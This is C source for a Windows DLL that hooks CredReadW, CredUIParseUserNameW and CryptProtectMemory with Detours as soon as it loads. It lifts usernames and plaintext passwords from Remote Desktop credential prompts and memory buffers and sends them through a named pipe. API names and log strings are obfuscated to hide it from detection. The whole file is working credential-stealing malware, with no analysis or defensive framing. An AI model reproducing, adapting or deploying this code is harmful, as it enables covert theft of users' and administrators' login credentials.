#include <stdio.h>
#include <windows.h>
#include <wincred.h>
#include "config.h"
#include "detours.h"
#include "obf.h"
#include "pipe.h"

typedef DWORD (WINAPI* PFN_CredUIParseUserNameW)(
    PCWSTR userName, WCHAR* user, ULONG userBufferSize, WCHAR* domain, ULONG domainBufferSize);

typedef BOOL (WINAPI* PFN_CryptProtectMemory)(LPVOID pDataIn, DWORD cbDataIn, DWORD dwFlags);

typedef BOOL (WINAPI* PFN_CredReadW)(LPCWSTR pszTargetName, DWORD dwType, DWORD dwFlags, PCREDENTIALW* ppCredential);

static PFN_CredUIParseUserNameW pOrigCredUIParseUserNameW = NULL;
static PFN_CryptProtectMemory    pOrigCryptProtectMemory    = NULL;
static PFN_CredReadW             pOrigCredReadW             = NULL;

static WCHAR gTarget[MAX_PATH] = { 0 };
static WCHAR gStagedUser[256]  = { 0 };
static WCHAR gStagedPass[256]  = { 0 };
static WCHAR gLastTarget[MAX_PATH] = { 0 };
static WCHAR gLastUser[256]        = { 0 };
static WCHAR gLastPass[256]        = { 0 };
static CRITICAL_SECTION gLogLock;

static void StoreWideString(WCHAR* dest, size_t destCount, LPCWSTR src) {
    if (!dest || destCount == 0)
        return;
    dest[0] = L'\0';
    if (!src)
        return;
    wcsncpy_s(dest, destCount, src, _TRUNCATE);
}

static void DecodeFmtLine(WCHAR* out, size_t outCount, const unsigned char* enc, size_t encLen) {
    size_t n;

    if (!out || outCount < 4)
        return;

    obfDecodeW(out, enc, encLen);
    n = wcslen(out);
    if (n + 2 < outCount) {
        out[n] = L'\n';
        out[n + 1] = L'\0';
    }
}

static BOOL IsPrintableCredentialText(LPCWSTR text, size_t len, size_t minLen) {
    if (!text || len < minLen || len > 127)
        return FALSE;

    for (size_t i = 0; i < len; i++) {
        WCHAR ch = text[i];
        if (ch < 0x20 || ch > 0x7E)
            return FALSE;
    }

    return TRUE;
}

static BOOL ExtractPasswordFromCryptBuffer(LPCVOID data, DWORD cbData, WCHAR* out, size_t outCount) {
    DWORD byteLen;
    size_t charCount;
    const WCHAR* text;

    if (!data || !out || outCount < 2)
        return FALSE;

    if (cbData < sizeof(DWORD) + sizeof(WCHAR) || (cbData % CRYPTPROTECTMEMORY_BLOCK_SIZE) != 0)
        return FALSE;

    byteLen = *(const DWORD*)data;
    if (byteLen < sizeof(WCHAR) || (byteLen % sizeof(WCHAR)) != 0)
        return FALSE;
    if (sizeof(DWORD) + byteLen > cbData)
        return FALSE;

    charCount = byteLen / sizeof(WCHAR);
    if (charCount < 1 || charCount >= outCount)
        return FALSE;

    text = (const WCHAR*)((const BYTE*)data + sizeof(DWORD));
    if (!IsPrintableCredentialText(text, charCount, 1))
        return FALSE;

    wcsncpy_s(out, outCount, text, charCount);
    return TRUE;
}

static BOOL LooksLikeUsername(LPCWSTR value) {
    if (!value || value[0] == L'\0')
        return FALSE;

    size_t len = wcslen(value);
    if (len < 2 || len >= 255)
        return FALSE;

    for (size_t i = 0; i < len; i++) {
        WCHAR ch = value[i];
        if (ch == L'\\' || ch == L'@' || ch == L'.' || ch == L'-' || ch == L'_')
            continue;
        if (ch < 0x20 || ch > 0x7E)
            return FALSE;
    }

    return TRUE;
}

static BOOL LooksLikePassword(LPCWSTR value, LPCWSTR username) {
    size_t len;

    if (!value || value[0] == L'\0')
        return FALSE;

    len = wcslen(value);
    if (len < 3 || !IsPrintableCredentialText(value, len, 3))
        return FALSE;

    if (username && username[0] != L'\0' && wcscmp(value, username) == 0)
        return FALSE;

    return TRUE;
}

static void ComposeDomainUser(LPCWSTR domain, LPCWSTR user, WCHAR* out, size_t outCount) {
    if (!out || outCount == 0 || !user || user[0] == L'\0')
        return;

    if (domain && domain[0] != L'\0')
        swprintf_s(out, outCount, L"%s\\%s", domain, user);
    else
        StoreWideString(out, outCount, user);
}

static void FormatTimestamp(WCHAR* buffer, size_t bufferCount) {
    SYSTEMTIME st = { 0 };
    GetLocalTime(&st);
    swprintf_s(buffer, bufferCount, L"%04u-%02u-%02u %02u:%02u:%02u",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
}

static void AppendCaptureLog(LPCWSTR username, LPCWSTR password) {
    WCHAR timestamp[32] = { 0 };
    WCHAR fmtSep[64] = { 0 };
    WCHAR fmtCaptured[32] = { 0 };
    WCHAR fmtTarget[32] = { 0 };
    WCHAR fmtUsername[32] = { 0 };
    WCHAR fmtPassword[32] = { 0 };
    WCHAR line[512] = { 0 };
    WCHAR entry[2048] = { 0 };
    WCHAR empty[2] = L"";

    FormatTimestamp(timestamp, _countof(timestamp));
    DecodeFmtLine(fmtSep, _countof(fmtSep), enc_log_sep, sizeof(enc_log_sep));
    DecodeFmtLine(fmtCaptured, _countof(fmtCaptured), enc_log_captured, sizeof(enc_log_captured));
    DecodeFmtLine(fmtTarget, _countof(fmtTarget), enc_log_target, sizeof(enc_log_target));
    DecodeFmtLine(fmtUsername, _countof(fmtUsername), enc_log_username, sizeof(enc_log_username));
    DecodeFmtLine(fmtPassword, _countof(fmtPassword), enc_log_password, sizeof(enc_log_password));

    wcscpy_s(entry, _countof(entry), fmtSep);
    swprintf_s(line, _countof(line), fmtCaptured, timestamp);
    wcscat_s(entry, _countof(entry), line);
    swprintf_s(line, _countof(line), fmtTarget, gTarget[0] != L'\0' ? gTarget : empty);
    wcscat_s(entry, _countof(entry), line);
    swprintf_s(line, _countof(line), fmtUsername, username && username[0] != L'\0' ? username : empty);
    wcscat_s(entry, _countof(entry), line);
    swprintf_s(line, _countof(line), fmtPassword, password && password[0] != L'\0' ? password : empty);
    wcscat_s(entry, _countof(entry), line);
    wcscat_s(entry, _countof(entry), L"\n");

    PipeClientSend(entry);

    obfZero(fmtSep, sizeof(fmtSep));
    obfZero(fmtCaptured, sizeof(fmtCaptured));
    obfZero(fmtTarget, sizeof(fmtTarget));
    obfZero(fmtUsername, sizeof(fmtUsername));
    obfZero(fmtPassword, sizeof(fmtPassword));
    obfZero(line, sizeof(line));
    obfZero(entry, sizeof(entry));
}

static BOOL IsDuplicateCapture(LPCWSTR username, LPCWSTR password) {
    return wcscmp(gTarget, gLastTarget) == 0
        && wcscmp(username, gLastUser) == 0
        && wcscmp(password, gLastPass) == 0;
}

static void RememberCapture(LPCWSTR username, LPCWSTR password) {
    StoreWideString(gLastTarget, _countof(gLastTarget), gTarget);
    StoreWideString(gLastUser, _countof(gLastUser), username);
    StoreWideString(gLastPass, _countof(gLastPass), password);
}

static void StageUsername(LPCWSTR username) {
    if (!LooksLikeUsername(username) || wcscmp(gStagedUser, username) == 0)
        return;
    StoreWideString(gStagedUser, _countof(gStagedUser), username);
}

static void StagePassword(LPCWSTR password) {
    if (!LooksLikePassword(password, gStagedUser) || wcscmp(gStagedPass, password) == 0)
        return;
    StoreWideString(gStagedPass, _countof(gStagedPass), password);
}

static void StageTargetFromCredName(LPCWSTR pszTargetName) {
    WCHAR prefix[16] = { 0 };
    const WCHAR* host;
    size_t prefixLen;

    if (!pszTargetName || pszTargetName[0] == L'\0')
        return;

    obfDecodeW(prefix, enc_termsrv_prefix, sizeof(enc_termsrv_prefix));
    prefixLen = wcslen(prefix);
    host = pszTargetName;
    if (prefixLen > 0 && _wcsnicmp(pszTargetName, prefix, prefixLen) == 0)
        host = pszTargetName + prefixLen;

    if (host[0] == L'\0') {
        obfZero(prefix, sizeof(prefix));
        return;
    }

    if (gTarget[0] != L'\0' && wcscmp(gTarget, host) != 0) {
        gStagedUser[0] = L'\0';
        gStagedPass[0] = L'\0';
    }

    StoreWideString(gTarget, _countof(gTarget), host);
    obfZero(prefix, sizeof(prefix));
}

static void StagePasswordFromCredBlob(LPCBYTE blob, DWORD cbBlob) {
    WCHAR password[256] = { 0 };
    size_t charCount;
    size_t i;

    if (!blob || cbBlob < sizeof(WCHAR))
        return;

    charCount = cbBlob / sizeof(WCHAR);
    if (charCount >= _countof(password))
        charCount = _countof(password) - 1;

    for (i = 0; i < charCount; i++)
        password[i] = ((const WCHAR*)blob)[i];

    password[charCount] = L'\0';
    if (!IsPrintableCredentialText(password, wcslen(password), 3))
        return;

    StagePassword(password);
}

static void MaybeFlush(void) {
    if (gTarget[0] == L'\0' || gStagedUser[0] == L'\0' || gStagedPass[0] == L'\0')
        return;

    if (IsDuplicateCapture(gStagedUser, gStagedPass))
        return;

    AppendCaptureLog(gStagedUser, gStagedPass);
    RememberCapture(gStagedUser, gStagedPass);

    gStagedUser[0] = L'\0';
    gStagedPass[0] = L'\0';
}

static BOOL WINAPI WrapCredReadW(
    LPCWSTR pszTargetName,
    DWORD dwType,
    DWORD dwFlags,
    PCREDENTIALW* ppCredential)
{
    BOOL result = pOrigCredReadW(pszTargetName, dwType, dwFlags, ppCredential);

    if (result && ppCredential && *ppCredential) {
        PCREDENTIALW cred = *ppCredential;
        LPCWSTR targetName = pszTargetName;

        EnterCriticalSection(&gLogLock);
        if (!targetName || targetName[0] == L'\0')
            targetName = cred->TargetName;

        if (targetName)
            StageTargetFromCredName(targetName);
        if (cred->UserName)
            StageUsername(cred->UserName);
        if (cred->CredentialBlob && cred->CredentialBlobSize > 0)
            StagePasswordFromCredBlob(cred->CredentialBlob, cred->CredentialBlobSize);
        MaybeFlush();
        LeaveCriticalSection(&gLogLock);
    }

    return result;
}

static DWORD WINAPI WrapCredUIParseUserNameW(
    PCWSTR userName,
    WCHAR* user,
    ULONG userBufferSize,
    WCHAR* domain,
    ULONG domainBufferSize)
{
    DWORD result = pOrigCredUIParseUserNameW(
        userName, user, userBufferSize, domain, domainBufferSize);

    EnterCriticalSection(&gLogLock);
    if (result == NO_ERROR && user && user[0] != L'\0') {
        WCHAR username[256] = { 0 };
        ComposeDomainUser(domain, user, username, _countof(username));
        StageUsername(username);
    } else if (LooksLikeUsername(userName)) {
        StageUsername(userName);
    }
    MaybeFlush();
    LeaveCriticalSection(&gLogLock);

    return result;
}

static BOOL WINAPI WrapCryptProtectMemory(LPVOID pDataIn, DWORD cbDataIn, DWORD dwFlags) {
    WCHAR password[256] = { 0 };

    if (ExtractPasswordFromCryptBuffer(pDataIn, cbDataIn, password, _countof(password))) {
        EnterCriticalSection(&gLogLock);
        StagePassword(password);
        MaybeFlush();
        LeaveCriticalSection(&gLogLock);
    }

    return pOrigCryptProtectMemory(pDataIn, cbDataIn, dwFlags);
}

static BOOL AttachDispatch(PVOID* target, PVOID thunk) {
    if (!target || !*target || !thunk)
        return FALSE;
    return DetourAttach(target, thunk) == NO_ERROR;
}

static BOOL ClientInit(void) {
    ULONG attached = 0;

    pOrigCredReadW = (PFN_CredReadW)obfResolveApi(
        enc_advapi32_dll, sizeof(enc_advapi32_dll),
        enc_CredReadW, sizeof(enc_CredReadW));

    pOrigCredUIParseUserNameW = (PFN_CredUIParseUserNameW)obfResolveApi(
        enc_credui_dll, sizeof(enc_credui_dll),
        enc_CredUIParseUserNameW, sizeof(enc_CredUIParseUserNameW));

    pOrigCryptProtectMemory = (PFN_CryptProtectMemory)obfResolveApi(
        enc_crypt32_dll, sizeof(enc_crypt32_dll),
        enc_CryptProtectMemory, sizeof(enc_CryptProtectMemory));

    if (!pOrigCredReadW || !pOrigCredUIParseUserNameW || !pOrigCryptProtectMemory)
        return FALSE;

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    if (AttachDispatch((PVOID*)&pOrigCredReadW, WrapCredReadW))
        attached++;
    if (AttachDispatch((PVOID*)&pOrigCredUIParseUserNameW, WrapCredUIParseUserNameW))
        attached++;
    if (AttachDispatch((PVOID*)&pOrigCryptProtectMemory, WrapCryptProtectMemory))
        attached++;

    if (attached < 3) {
        DetourTransactionAbort();
        return FALSE;
    }

    return DetourTransactionCommit() == NO_ERROR;
}

static BOOL ClientShutdown(void) {
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    if (pOrigCredReadW)
        DetourDetach((PVOID*)&pOrigCredReadW, WrapCredReadW);
    if (pOrigCredUIParseUserNameW)
        DetourDetach((PVOID*)&pOrigCredUIParseUserNameW, WrapCredUIParseUserNameW);
    if (pOrigCryptProtectMemory)
        DetourDetach((PVOID*)&pOrigCryptProtectMemory, WrapCryptProtectMemory);

    return DetourTransactionCommit() == NO_ERROR;
}

extern "C" __declspec(dllexport) BOOL WINAPI Init(LPVOID lpUserData, DWORD nUserdataLen) {
    (void)lpUserData;
    (void)nUserdataLen;
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinst);
            InitializeCriticalSection(&gLogLock);
            PipeClientInit();
            ClientInit();
            break;

        case DLL_PROCESS_DETACH:
            ClientShutdown();
            PipeClientShutdown();
            DeleteCriticalSection(&gLogLock);
            break;
    }

    return TRUE;
}
